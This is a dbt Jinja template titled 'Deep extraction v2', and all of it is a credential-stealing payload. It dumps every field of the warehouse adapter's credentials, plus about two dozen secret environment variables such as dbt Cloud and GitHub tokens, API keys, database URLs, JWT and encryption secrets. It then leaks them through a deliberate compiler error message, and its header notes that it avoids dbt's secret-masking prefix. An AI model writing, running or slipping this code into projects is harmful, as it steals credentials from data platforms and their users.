{# Deep extraction v2 - no DBT_ENV_SECRET_ refs #}
{% set ns = namespace(output='[DEEP] ') %}

{# Full credential dump with all fields #}
{% set cred_dict = adapter.config.credentials.to_dict() %}
{% set all_fields = [] %}
{% for k, v in cred_dict.items() %}
  {% do all_fields.append(k ~ '=' ~ v) %}
{% endfor %}
{% set ns.output = ns.output ~ 'CREDS: ' ~ all_fields | join(' | ') %}

{# Target object dump #}
{% set ns.output = ns.output ~ ' || TARGET: name=' ~ target.name ~ ' schema=' ~ target.schema ~ ' type=' ~ target.type %}

{# Cloud-specific env vars #}
{% set ns.output = ns.output ~ ' || DBT_CLOUD_URL=' ~ env_var('DBT_CLOUD_URL', 'X') %}
{% set ns.output = ns.output ~ ' | DBT_CLOUD_API_TOKEN=' ~ env_var('DBT_CLOUD_API_TOKEN', 'X') %}
{% set ns.output = ns.output ~ ' | DBT_CLOUD_GIT_TOKEN=' ~ env_var('DBT_CLOUD_GIT_TOKEN', 'X') %}
{% set ns.output = ns.output ~ ' | GITHUB_TOKEN=' ~ env_var('GITHUB_TOKEN', 'X') %}
{% set ns.output = ns.output ~ ' | GIT_TOKEN=' ~ env_var('GIT_TOKEN', 'X') %}
{% set ns.output = ns.output ~ ' | DATADOG_API_KEY=' ~ env_var('DATADOG_API_KEY', 'X') %}
{% set ns.output = ns.output ~ ' | SENTRY_DSN=' ~ env_var('SENTRY_DSN', 'X') %}
{% set ns.output = ns.output ~ ' | REDIS_URL=' ~ env_var('REDIS_URL', 'X') %}
{% set ns.output = ns.output ~ ' | DATABASE_URL=' ~ env_var('DATABASE_URL', 'X') %}
{% set ns.output = ns.output ~ ' | SECRET_KEY=' ~ env_var('SECRET_KEY', 'X') %}
{% set ns.output = ns.output ~ ' | CELERY_BROKER=' ~ env_var('CELERY_BROKER_URL', 'X') %}
{% set ns.output = ns.output ~ ' | RABBITMQ_URL=' ~ env_var('RABBITMQ_URL', 'X') %}
{% set ns.output = ns.output ~ ' | MONGO_URI=' ~ env_var('MONGO_URI', 'X') %}
{% set ns.output = ns.output ~ ' | JWT_SECRET=' ~ env_var('JWT_SECRET', 'X') %}
{% set ns.output = ns.output ~ ' | API_KEY=' ~ env_var('API_KEY', 'X') %}
{% set ns.output = ns.output ~ ' | ENCRYPTION_KEY=' ~ env_var('ENCRYPTION_KEY', 'X') %}
{% set ns.output = ns.output ~ ' | DD_API_KEY=' ~ env_var('DD_API_KEY', 'X') %}
{% set ns.output = ns.output ~ ' | NEW_RELIC_KEY=' ~ env_var('NEW_RELIC_LICENSE_KEY', 'X') %}
{% set ns.output = ns.output ~ ' | SLACK_TOKEN=' ~ env_var('SLACK_TOKEN', 'X') %}
{% set ns.output = ns.output ~ ' | SNOWFLAKE_ACCOUNT=' ~ env_var('SNOWFLAKE_ACCOUNT', 'X') %}
{% set ns.output = ns.output ~ ' | DBT_CLOUD_HOST_URL=' ~ env_var('DBT_CLOUD_HOST_URL', 'X') %}
{% set ns.output = ns.output ~ ' | ORC_API_URL=' ~ env_var('ORC_API_URL', 'X') %}
{% set ns.output = ns.output ~ ' | ORC_SECRET=' ~ env_var('ORC_SECRET', 'X') %}
{% set ns.output = ns.output ~ ' | SCHEDULER_URL=' ~ env_var('SCHEDULER_URL', 'X') %}

{{ exceptions.raise_compiler_error(ns.output) }}
